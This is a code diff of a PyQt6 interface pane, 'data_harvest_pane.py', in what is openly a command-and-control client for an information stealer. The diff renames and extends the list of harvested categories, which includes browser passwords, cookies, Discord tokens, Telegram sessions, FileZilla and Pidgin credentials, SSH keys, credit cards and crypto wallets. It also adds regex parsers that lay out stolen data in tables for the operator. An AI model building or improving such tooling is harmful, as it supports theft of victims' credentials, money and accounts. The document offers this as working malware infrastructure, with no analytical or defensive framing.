@@ -1,18 +1,17 @@
 # C2_Client/ui/data_harvest_pane.py
+import re
 from PyQt6.QtWidgets import (QWidget, QHBoxLayout, QListWidget, QStackedWidget, 
                              QVBoxLayout, QTableWidget, QTextEdit, 
-                             QHeaderView, QTableWidgetItem, QAbstractItemView, QPushButton)
-from PyQt6.QtCore import pyqtSignal
+                             QHeaderView, QTableWidgetItem, QAbstractItemView)
+from PyQt6.QtCore import Qt
 
 class DataHarvestPane(QWidget):
-    decryption_requested = pyqtSignal()
-
+    
     def __init__(self):
         super().__init__()
         
         main_layout = QHBoxLayout(self)
         
-        # --- Left Pane: Category List ---
         left_pane_widget = QWidget()
         left_pane_layout = QVBoxLayout(left_pane_widget)
         left_pane_layout.setContentsMargins(0,0,0,0)
@@ -20,139 +19,114 @@ class DataHarvestPane(QWidget):
 
         self.category_list = QListWidget()
         self.categories = [
-            "System Info", "Hardware Info", "Security Products", "Installed Applications", 
-            "Running Processes", "Environment Variables", "Network Info", "Wi-Fi Passwords", 
-            "Active Connections", "ARP Table", "DNS Cache", "Browser Passwords", 
-            "Session Cookies", "Windows Vault Credentials", "Application Credentials", 
-            "Discord Tokens", "Roblox Cookies", "SSH Keys", "Telegram Session Files", 
-            "Credit Card Data", "Cryptocurrency Wallet Files", "Browser Autofill", 
-            "Browser History", "Clipboard Contents", "Browser Files"
+            "1. OS Version & Build", "2. System Architecture", "3. CPU Model", "4. GPU Model(s)",
+            "5. Installed RAM", "6. Disk Drives", "7. Hostname", "8. User Accounts", "9. System Uptime",
+            "10. Running Processes", "11. Installed Apps", "12. Security Products", "13. Environment Variables",
+            "14. Private IP", "15. Public IP", "16. MAC Address", "17. Wi-Fi Passwords", "18. Active Connections",
+            "19. ARP Table", "20. DNS Cache", "21. Browser Passwords", "22. Browser Cookies",
+            "24. Discord Tokens", "25. Telegram Session", "26. FileZilla Credentials", "27. Pidgin Credentials",
+            "28. SSH Keys", "29. Browser Credit Cards", "30. Crypto Wallets", "31. Sensitive Documents",
+            "32. Browser History", "33. Browser Autofill", "34. Clipboard Contents"
         ]
         self.category_list.addItems(self.categories)
         left_pane_layout.addWidget(self.category_list)
-
-        self.decrypt_button = QPushButton("Decrypt Browser Data")
-        self.decrypt_button.setObjectName("SanitizeButton") # Use the red button style
-        self.decrypt_button.clicked.connect(self.decryption_requested.emit)
-        left_pane_layout.addWidget(self.decrypt_button)
         main_layout.addWidget(left_pane_widget)
         
-        # --- Right Pane: Content Display ---
         self.content_stack = QStackedWidget()
         main_layout.addWidget(self.content_stack, 1)
         
-        # Create a view widget for each category and store it
+        # --- UI MAPPING: Switched more views to tables for better readability ---
         self.view_map = {
-            "System Info": self._create_text_view(), "Hardware Info": self._create_text_view(),
-            "Security Products": self._create_text_view(), "Installed Applications": self._create_text_view(is_mono=True),
-            "Running Processes": self._create_table(["PID", "Name", "Username"]), "Environment Variables": self._create_text_view(is_mono=True),
-            "Network Info": self._create_text_view(), "Wi-Fi Passwords": self._create_table(["SSID", "Password"]),
-            "Active Connections": self._create_text_view(is_mono=True), "ARP Table": self._create_text_view(is_mono=True),
-            "DNS Cache": self._create_text_view(is_mono=True), "Browser Passwords": self._create_table(["Browser", "URL", "Username", "Password"]),
-            "Session Cookies": self._create_table(["Host", "Name", "Expires (UTC)", "Value"]), "Windows Vault Credentials": self._create_table(["Resource", "Username", "Password"]),
-            "Application Credentials": self._create_table(["Host", "Port", "Username", "Password"]), "Discord Tokens": self._create_text_view(is_mono=True),
-            "Roblox Cookies": self._create_text_view(is_mono=True), "SSH Keys": self._create_text_view(is_mono=True),
-            "Telegram Session Files": self._create_text_view(), "Credit Card Data": self._create_table(["Name on Card", "Expires (MM/YY)", "Card Number"]),
-            "Cryptocurrency Wallet Files": self._create_text_view(is_mono=True), "Browser Autofill": self._create_table(["Field Name", "Value"]),
-            "Browser History": self._create_table(["URL", "Title", "Visit Count", "Last Visit (UTC)"]), "Clipboard Contents": self._create_text_view(is_mono=True),
-            "Browser Files": self._create_text_view()
+            "1. OS Version & Build": self._create_text_view(), "2. System Architecture": self._create_text_view(),
+            "3. CPU Model": self._create_text_view(), "4. GPU Model(s)": self._create_text_view(is_mono=True),
+            "5. Installed RAM": self._create_text_view(), "6. Disk Drives": self._create_text_view(is_mono=True),
+            "7. Hostname": self._create_text_view(), "8. User Accounts": self._create_text_view(is_mono=True),
+            "9. System Uptime": self._create_text_view(), "10. Running Processes": self._create_text_view(is_mono=True),
+            "11. Installed Apps": self._create_text_view(is_mono=True), "12. Security Products": self._create_text_view(is_mono=True),
+            "13. Environment Variables": self._create_text_view(is_mono=True), "14. Private IP": self._create_text_view(),
+            "15. Public IP": self._create_text_view(), "16. MAC Address": self._create_text_view(),
+            "17. Wi-Fi Passwords": self._create_table(["SSID", "Password"]),
+            "18. Active Connections": self._create_text_view(is_mono=True), "19. ARP Table": self._create_text_view(is_mono=True),
+            "20. DNS Cache": self._create_text_view(is_mono=True),
+            "21. Browser Passwords": self._create_table(["Source", "URL", "Username", "Password"]),
+            "22. Browser Cookies": self._create_table(["Source", "Host", "Name", "Value"]), # Now a table
+            "24. Discord Tokens": self._create_text_view(is_mono=True),
+            "25. Telegram Session": self._create_text_view(),
+            "26. FileZilla Credentials": self._create_table(["Host", "User", "Password"]),
+            "27. Pidgin Credentials": self._create_table(["Protocol", "User", "Password"]),
+            "28. SSH Keys": self._create_text_view(is_mono=True),
+            "29. Browser Credit Cards": self._create_table(["Source", "Name on Card", "Expires", "Card Number"]),
+            "30. Crypto Wallets": self._create_text_view(), "31. Sensitive Documents": self._create_text_view(is_mono=True),
+            "32. Browser History": self._create_table(["Source", "Title", "URL"]), # Now a table
+            "33. Browser Autofill": self._create_table(["Source", "Field Name", "Value"]), # Now a table
+            "34. Clipboard Contents": self._create_text_view(is_mono=True)
         }
         
         self.ordered_keys = list(self.view_map.keys())
-        for key in self.ordered_keys:
-            self.content_stack.addWidget(self.view_map[key])
-
+        for key in self.ordered_keys: self.content_stack.addWidget(self.view_map[key])
         self.category_list.currentItemChanged.connect(self.on_category_change)
-        if self.category_list.count() > 0:
-            self.category_list.setCurrentRow(0)
+        if self.category_list.count() > 0: self.category_list.setCurrentRow(0)
 
     def on_category_change(self, current_item):
-        """Switches the view in the QStackedWidget when a category is selected."""
         if not current_item: return
-        index = self.category_list.row(current_item)
-        if 0 <= index < len(self.ordered_keys):
-            self.content_stack.setCurrentWidget(self.view_map[self.ordered_keys[index]])
+        self.content_stack.setCurrentWidget(self.view_map[self.ordered_keys[self.category_list.row(current_item)]])
 
     def _create_text_view(self, is_mono=False):
-        """Helper to create a standardized QTextEdit for displaying text data."""
-        text_edit = QTextEdit()
-        text_edit.setReadOnly(True)
-        if is_mono:
-            text_edit.setFontFamily("Consolas")
+        text_edit = QTextEdit(); text_edit.setReadOnly(True)
+        if is_mono: text_edit.setFontFamily("Consolas")
         return text_edit
 
     def _create_table(self, headers):
-        """Helper to create a standardized QTableWidget for displaying tabular data."""
-        table = QTableWidget()
-        table.setColumnCount(len(headers))
-        table.setHorizontalHeaderLabels(headers)
+        table = QTableWidget(); table.setColumnCount(len(headers)); table.setHorizontalHeaderLabels(headers)
         table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.ResizeToContents)
-        table.horizontalHeader().setStretchLastSection(True)
-        table.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
-        table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
-        table.verticalHeader().setVisible(False)
-        table.setSortingEnabled(True)
-        return table
+        table.horizontalHeader().setStretchLastSection(True); table.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
+        table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows); table.verticalHeader().setVisible(False)
+        table.setSortingEnabled(True); return table
 
     def clear_all_views(self):
-        """Resets all display widgets to their default state."""
         for view in self.view_map.values():
-            if isinstance(view, QTextEdit):
-                view.setText("Awaiting data...")
-            elif isinstance(view, QTableWidget):
-                view.setRowCount(0)
+            if isinstance(view, QTextEdit): view.setText("Awaiting data...")
+            elif isinstance(view, QTableWidget): view.setRowCount(0)
 
-    def update_view(self, module_name, data):
-        """The main method to populate a view with new data from the C2."""
-        view_key = module_name.replace(" (Raw)", "")
-        view = self.view_map.get(view_key)
+    def update_view(self, module_name, data_packet):
+        view = self.view_map.get(module_name)
         if not view: return
-
-        status = data.get("status", "success")
-        payload = data.get('data')
+        payload = data_packet.get("output", {}).get("data", "No data found for this module.")
         
-        if status == "error":
-            if isinstance(view, QTextEdit): view.setText(f"Error harvesting this module:\n\n{payload}")
-            return
+        # --- NEW PARSERS for the enhanced payload output ---
+        parsers = {
+            "17. Wi-Fi Passwords": (re.findall(r"SSID:\s*(.*?)\nPassword:\s*(.*)", payload), self._populate_table_from_tuples),
+            "21. Browser Passwords": (re.findall(r"\[(.*?)\]\n\s*URL: (.*?)\n\s*User: (.*?)\n\s*Pass: (.*?)\n", payload), self._populate_table_from_tuples),
+            "22. Browser Cookies": (re.findall(r"\[(.*?)\]\n\s*Host: (.*?)\n\s*Name: (.*?)\n\s*Value: (.*?)\n", payload), self._populate_table_from_tuples),
+            "26. FileZilla Credentials": (re.findall(r"Host:\s*(.*?)\nUser:\s*(.*?)\nPass:\s*(.*?)\n", payload), self._populate_table_from_tuples),
+            "27. Pidgin Credentials": (re.findall(r"Protocol:\s*(.*?)\nUser:\s*(.*?)\nPass:\s*(.*?)\n", payload), self._populate_table_from_tuples),
+            "29. Browser Credit Cards": (re.findall(r"\[(.*?)\]\n\s*Name: (.*?)\n\s*Expires: (.*?)\n\s*Number: (.*?)\n", payload), self._populate_table_from_tuples),
+            "32. Browser History": (re.findall(r"\[(.*?)\]\n\s*Title: (.*?)\n\s*URL: (.*?)\n", payload), self._populate_table_from_tuples),
+            "33. Browser Autofill": (re.findall(r"\[(.*?)\]\n\s*Field: (.*?)\n\s*Value: (.*?)\n", payload), self._populate_table_from_tuples),
+        }
+        
+        if module_name in parsers:
+            parsed_data, handler = parsers[module_name]
+            handler(view, parsed_data)
+        elif isinstance(view, QTextEdit):
+            view.setText(str(payload))
 
-        if view_key == "Browser Files":
-            size_kb = len(payload.get("data", "")) / 1024 if payload else 0
-            view.setText(f"Received browser data package.\n\nSize: {size_kb:.2f} KB\n\nClick 'Decrypt Browser Data' to process.")
-            return
-
-        if isinstance(view, QTextEdit):
-            self._populate_text_view(view, payload)
-        elif isinstance(view, QTableWidget):
-            self._populate_table(view, payload)
-
-    def _populate_text_view(self, view, data):
-        if not data:
-            view.setText("No data found.")
-            return
-        if isinstance(data, dict):
-            html = "".join([f"<p><b>{key.replace('_', ' ').title()}:</b> {value}</p>" for key, value in data.items()])
-            view.setHtml(html)
-        elif isinstance(data, list):
-            view.setText("\n".join(map(str, data)))
-        else:
-            view.setText(str(data))
-
-    def _populate_table(self, table, data_list):
+    def _populate_table_from_tuples(self, table, data_list):
         table.setSortingEnabled(False)
-        if not isinstance(data_list, list) or not data_list:
-            table.setRowCount(0)
-            table.setSortingEnabled(True)
-            return
-            
-        table.setRowCount(len(data_list))
-        header_map = {header.lower().replace(' ', '_'): i for i, header in enumerate([table.horizontalHeaderItem(j).text() for j in range(table.columnCount())])}
+        table.setRowCount(0)
         
-        for row_idx, row_data in enumerate(data_list):
-            if isinstance(row_data, dict):
-                normalized_data_keys = {k.lower().replace(' ', '_'): v for k, v in row_data.items()}
-                for key, col_idx in header_map.items():
-                    value = normalized_data_keys.get(key, '')
-                    table.setItem(row_idx, col_idx, QTableWidgetItem(str(value)))
-                    
-        table.resizeColumnsToContents()
+        if not data_list:
+            table.setRowCount(1)
+            item = QTableWidgetItem("No data found for this module.")
+            item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
+            table.setItem(0, 0, item)
+            if table.columnCount() > 1:
+                table.setSpan(0, 0, 1, table.columnCount())
+        else:
+            table.setRowCount(len(data_list))
+            for row_idx, row_data in enumerate(data_list):
+                for col_idx, cell_data in enumerate(row_data):
+                    table.setItem(row_idx, col_idx, QTableWidgetItem(str(cell_data).strip()))
+            table.resizeColumnsToContents()
+        
         table.setSortingEnabled(True)
